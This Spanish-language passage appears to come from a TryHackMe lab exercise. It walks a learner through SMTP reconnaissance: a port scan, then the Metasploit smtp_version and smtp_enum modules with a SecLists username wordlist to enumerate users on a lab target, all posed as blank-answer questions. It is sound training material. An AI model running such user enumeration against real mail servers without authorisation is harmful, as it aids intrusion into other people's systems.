Esta écnica se podría adaptar en el futuro para que funcione contra otros demonios SMTP vulnerables, pero esto no se ha hecho hasta el momento de escribir este artículo. Es una alternativa que vale la pena tener en cuenta si está tratando de distanciarse del uso de Metasploit, (por ejemplo, en preparación para OSCP).

Ahora que cubrimos la teoría, ¡Comencemos!

### Responda las preguntas a continuación
- Primero, ejecutemos un escaneo de puertos contra la máquina objetivo, igual que la última vez. ¿En qué puerto se ejecuta SMTP? ``

- Bien, ahora que sabemos a qué puerto debemos apuntar, iniciemos Metasploit. ¿Qué comando usamos para hacer esto?

- Si desea más ayuda o práctica con Metasploit, TryHackMe tiene un módulo sobre Metasploit que puede consultar [aquí](). Busquemos el módulo `smtp_version`, ¿cuál es el nombre completo del módulo?

- Genial, ahora seleccione el módulo y enumere las opciones. ¿Cómo lo hacemos?

- Eche un vistazo a las opciones, ¿todo parece correcto? ¿Cuál es la opción que necesitamos configurar?

- Establezca el valor correcto para su máquina objetivo, Luego ejecute el exploit. ¿Cuál es el nombre del correo del sistema?

- ¿Qué agente de transferencia de correo (MTA) está ejecutando el servidor SMTP? (Esto requerirá una investigación externa).

- ¡Bien! Ahora tenemos una buena cantidad de información sobre el sistema objetivo para pasar a la siguiente etapa. Busquemos el módulo `smtp_enum`, ¿cuál es el nombre completo del módulo?

- Vamos a utilizar la lista de palabras `top-usernames-shortlist.txt` de la subsección Nombres de usuario de seclists `/usr/share/wordlists/SecLists/Usernames` si ka tienes instalada.

SecLists es una colección increíble de listas de palabras. Si estas ejecutando Kali o Parrot, puedes instalar seclists con `sudo apt install seclists`. Alternativamente, puedes descargar el repositorio desde [aquí]().

- ¿Qué opción necesitamos configurar en la ruta de la lista de palabras?

- Una vez que hemos configurado esta opción, ¿cuál es el otro parámetro esencial que necesitamos configurar?

Ahora, ejecuta el exploit, esto pueede llevar unos minutos, así que toma una taza de té, café, agua. ¡Mantente hidratado!

- ¡Bien! Ahora qye está terminado, ¿qué nombre de usuario se devuelve?